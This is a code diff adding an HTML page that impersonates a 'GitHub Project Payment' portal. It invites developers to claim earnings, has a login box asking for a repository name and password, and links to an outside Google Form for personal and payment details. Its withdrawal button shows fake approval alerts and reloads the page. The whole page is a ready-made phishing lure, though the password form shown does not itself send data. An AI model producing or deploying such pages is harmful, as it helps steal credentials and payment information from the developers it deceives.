@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Github Payment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        #video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            object-fit: cover;
+        }
+
+        .content {
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        h1, h2, h3, h4 {
+            color: white;
+            text-align: center;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            font-size: 2.5rem;
+        }
+
+        #personal-details {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            max-width: 80%; /* Limit the width of the form container to 80% of the viewport width */
+            margin: 0 auto; /* Center the form horizontally */
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            outline: none;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Style for payment info */
+        .payment-info {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            max-width: 80%; /* Limit the width to 80% of the viewport */
+            margin: 0 auto; /* Center horizontally */
+        }
+    </style>
+</head>
+<body>
+    <video id="video-background" autoplay muted loop>
+        <source src="https://microintel.github.io/microintel/st.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+    <div class="content">
+        
+        <h2>Welcome to</h2>
+        <img src="g.png" width="60px" height="60px"></img>
+        <h1>Github Project Payment</h1>
+        <br><br><br>
+        <div id="personal-details">
+        <a href="https://forms.gle/FyH3sggkimuu8baK9" ><button>Please Fill Out Your Personal & Payment Details Here!</button></a>
+        </div>
+        <br><br><br>
+        <form>
+            <div id="personal-details">
+                <h3>Enter To Github</h3>
+                <hr>
+                <p><strong>Repository Name : </strong><input type="text" required></p>
+                <p><strong>Password : </strong><input type="password" required></p>
+        </form>
+        </div>
+        
+        <br><br><br>
+        <!-- Payment Withdrawal Information -->
+        <div class="payment-info">
+        <form>
+            <h3>Payment Withdrawal Information</h3>
+            <hr>
+            <p>To withdraw your earnings from this project, please provide the following Payment type:</p>
+            <p><strong>Withdrawal Amount:</strong> <input type="number" style="width: 100%" required></p>
+            <p><strong>Withdrawal Method:</strong> 
+                <select>
+                    <option value="paypal">PayPal</option>
+                    <option value="upi">Upi</option>
+                    <option>Gpay</option>
+                    <option>Phone Pe</option>
+                    <option>Paytm</option>
+                    <option>Fampay</option>
+                    <option>Zpay</option>
+                    <option>Ominis</option>
+                </select>
+            </p>
+            <center>
+                <button onclick="h()">Request Withdrawal</button>
+                </center>
+                </form>
+            </center>
+        </div>
+    </div>
+<script type="text/javascript">
+
+function h(){
+alert("You Payment Has Been Approved sucessfully");
+alert("Your Payment Will Be Done Within 24h");
+alert("Heartly Thank You To Our Lovely ,Smarty Dev");
+location.reload();
+}
+
+</script>
+</body>
+</html>
